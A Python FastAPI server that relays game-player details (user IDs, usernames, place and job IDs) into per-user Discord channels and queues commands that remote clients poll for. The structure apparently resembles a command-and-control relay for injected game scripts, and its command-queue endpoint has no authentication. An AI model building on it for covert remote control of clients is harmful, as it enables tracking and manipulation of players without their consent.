import os
import requests
from fastapi import FastAPI
from pydantic import BaseModel
from typing import List, Dict
import uvicorn

app = FastAPI()
token = os.getenv("DISCORD_BOT_TOKEN")
category_id = os.getenv("DISCORD_USERS_CATEGORY_ID")
guild_id = os.getenv("DISCORD_GUILD_ID")
headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
user_channels = {}
cmd_queue: Dict[str, List[Dict[str, str]]] = {}

class Info(BaseModel):
    userid: str
    username: str
    displayname: str
    game: str
    placeid: str
    jobid: str
    thumbnail: str

class Disconnect(BaseModel):
    userid: str

@app.post("/info_report")
async def info_report(info: Info):
    if info.userid not in user_channels:
        payload = {
            "name": info.userid,
            "type": 0,
            "parent_id": category_id
        }
        r = requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)
        if r.status_code == 201:
            channel_id = r.json()["id"]
            user_channels[info.userid] = channel_id
        else:
            return {"error": "failed to create channel"}
    else:
        channel_id = user_channels[info.userid]
    embed = {
        "title": "Player Joined",
        "color": 5763719,
        "thumbnail": {"url": info.thumbnail},
        "fields": [
            {"name": "Username", "value": info.username, "inline": True},
            {"name": "Display Name", "value": info.displayname, "inline": True},
            {"name": "User ID", "value": info.userid, "inline": True},
            {"name": "Game", "value": info.game, "inline": False},
            {"name": "Place ID", "value": info.placeid, "inline": True},
            {"name": "Job ID", "value": info.jobid, "inline": False}
        ]
    }
    requests.post(
        f"https://discord.com/api/v10/channels/{channel_id}/messages",
        headers=headers,
        json={"embeds": [embed]}
    )
    return {"status": "ok"}

@app.get("/poll/{userid}")
async def poll(userid: str):
    return cmd_queue.pop(userid, [])

@app.post("/disconnect")
async def disconnect(info: Disconnect):
    cmd_queue.pop(info.userid, None)
    if info.userid in user_channels:
        channel_id = user_channels[info.userid]
        requests.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers=headers,
            json={"content": f"User `{info.userid}` disconnected."}
        )
    return {"status": "ok"}

@app.post("/send_command/{userid}")
async def send_command(userid: str, cmd: Dict[str, str]):
    if userid not in cmd_queue:
        cmd_queue[userid] = []
    cmd_queue[userid].append(cmd)
    return {"status": "command queued"}

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000)
